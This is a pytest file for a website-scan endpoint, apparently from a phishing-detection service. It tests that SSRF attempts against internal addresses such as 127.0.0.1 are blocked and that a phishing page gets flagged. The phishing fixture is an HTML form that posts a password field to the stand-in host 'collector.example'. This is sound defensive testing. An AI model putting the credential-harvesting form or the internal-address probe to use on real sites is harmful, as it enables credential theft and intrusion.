"""Website scan endpoint. The fetcher is monkeypatched so no real network I/O
happens; the SSRF gate and the queued pipeline are exercised for real."""
import pytest

from app.services import website_fetcher
from app.services.ssrf import SSRFError

_HTML = (
    "<html><head><title>Account verification</title></head>"
    "<body><form action='http://collector.example/x' method='post'>"
    "<input type='password' name='pw'></form></body></html>"
)


def test_internal_url_is_rejected_with_ssrf_error(client):
    r = client.post("/api/v1/scans/website", json={"url": "http://127.0.0.1/admin"})
    assert r.status_code == 400
    assert r.json()["error"]["code"] == "SSRF_BLOCKED"


def test_website_scan_completes_with_fetched_html(client, monkeypatch):
    def fake_fetch(url, **kwargs):
        # Final URL is a seeded phishing domain so intel also fires.
        return website_fetcher.FetchResult(
            final_url="http://account-verify-login.example/login",
            status=200, html=_HTML, redirect_chain=[])

    monkeypatch.setattr(website_fetcher, "fetch", fake_fetch)
    # A public literal IP passes the pre-fetch SSRF gate without DNS.
    r = client.post("/api/v1/scans/website", json={"url": "http://93.184.216.34/"})
    assert r.status_code == 200, r.text
    data = r.json()["data"]
    assert data["status"] == "COMPLETE"
    assert data["risk_level"] in {"HIGH", "CRITICAL"}
    assert "password_field" in data["indicators"]


def test_redirect_to_internal_during_fetch_fails_gracefully(client, monkeypatch):
    def fake_fetch(url, **kwargs):
        raise SSRFError("The URL resolves to a disallowed (internal) address.")

    monkeypatch.setattr(website_fetcher, "fetch", fake_fetch)
    r = client.post("/api/v1/scans/website", json={"url": "http://93.184.216.34/"})
    assert r.status_code == 200
    data = r.json()["data"]
    assert data["status"] == "FAILED"
    assert "internal" in data["explanation"].lower()
